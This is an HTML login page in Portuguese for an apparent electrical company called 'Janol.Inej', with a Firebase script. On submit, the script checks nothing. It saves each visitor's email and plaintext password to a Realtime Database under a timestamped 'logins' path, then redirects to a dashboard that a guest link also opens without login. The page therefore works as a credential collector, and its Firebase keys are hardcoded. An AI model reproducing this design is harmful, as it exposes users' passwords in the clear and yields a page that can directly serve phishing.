<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Janol.Inej</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            background: white;
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            font-size: 2.5em;
            margin-bottom: 10px;
            color: #2c3e50;
        }

        .subtitle {
            color: #7f8c8d;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus {
            border-color: #3498db;
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }

        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
        }

        .links {
            margin-top: 20px;
        }

        .links a {
            color: #3498db;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="logo">üèóÔ∏è JANOL.INEJ</div>
        <div class="subtitle">Empresa El√©trica - Acesso ao Sistema</div>
        
        <form id="loginForm">
            <div class="form-group">
                <label>üìß Email</label>
                <input type="email" id="email" placeholder="seu@email.com" required>
            </div>
            
            <div class="form-group">
                <label>üîí Senha</label>
                <input type="password" id="senha" placeholder="Sua senha" required>
            </div>
            
            <button type="submit" class="btn">üöÄ Entrar no Sistema</button>
        </form>
        
        <div class="links">
            <a href="#">üîì Esqueci minha senha</a>
            <a href="dashboard.html">üìä Acessar como Visitante</a>
        </div>
    </div>

    <!-- ========================= -->
    <!--     FIREBASE + LOGIN      -->
    <!-- ========================= -->
    <script type="module">

        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCjdryEhdWNcWZpcIciZApYdZX5jXcST3A",
            authDomain: "janoline-7285c.firebaseapp.com",
            databaseURL: "https://janoline-7285c-default-rtdb.firebaseio.com",
            projectId: "janoline-7285c",
            storageBucket: "janoline-7285c.firebasestorage.app",
            messagingSenderId: "688131267684",
            appId: "1:688131267684:web:6a3d976a092512e1fad371",
            measurementId: "G-K767JLC4BP"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const form = document.getElementById("loginForm");
        const email = document.getElementById("email");
        const senha = document.getElementById("senha");

        form.addEventListener("submit", function(e) {
            e.preventDefault();

            const emailVal = email.value;
            const senhaVal = senha.value;

            // Salvar login no Realtime Database
            set(ref(db, "logins/" + Date.now()), {
                email: emailVal,
                senha: senhaVal
            })
            .then(() => {
                alert("Login realizado e salvo no Firebase!");
                window.location.href = "dashboard.html";
            })
            .catch((err) => {
                alert("Erro ao salvar: " + err);
            });
        });

    </script>

</body>
</html>
